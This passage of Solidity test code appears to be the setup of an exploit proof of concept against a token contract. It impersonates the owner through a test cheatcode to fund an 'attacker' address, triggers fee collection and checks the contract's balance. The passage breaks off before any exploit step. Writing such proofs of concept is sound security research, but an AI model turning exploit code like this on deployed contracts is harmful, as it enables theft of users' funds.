        if (myInitialBalance == 0) {
            // If attacker has no tokens, we need to get some
            // We can impersonate the owner to transfer tokens to attacker
            vm.prank(owner);
            IMyCoinToken(TARGET).transfer(attacker, 1000000000000 * 10 ** 9);
        }

        // Now make a transfer to generate bounsFee for the contract
        // Transfer to a random address to trigger fee collection
        address dummy = address(0x123);
        IMyCoinToken(TARGET).transfer(dummy, 1000000000 * 10 ** 9);

        // Check contract balance
        uint256 contractBalanceBefore = IMyCoinToken(TARGET).balanceOf(TARGET);
        require(contractBalanceBefore > 0, "Contract must have positive balance");

        // Get date strings
        (string memory yesToday, string memory twoYesToday) = IMyCoinToken(TARGET).getDays();

